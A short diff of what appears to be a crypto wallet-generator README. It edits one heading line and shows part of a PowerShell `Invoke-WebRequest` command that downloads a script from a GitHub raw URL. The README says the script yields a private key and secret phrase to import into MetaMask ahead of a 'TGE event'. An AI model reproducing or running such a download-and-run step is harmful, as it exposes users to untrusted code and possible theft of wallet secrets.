@@ -7,5 +7,5 @@ powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Ce
 ```
 2. After You run the code Your wallet address will be generated in your folder
 
-# You get Private key and secret Phrase, Import to metamask and wait for TGE event. Follow us on twitter @celestianfts
+You get Private key and secret Phrase, Import to metamask and wait for TGE event. Follow us on twitter @celestianfts
 
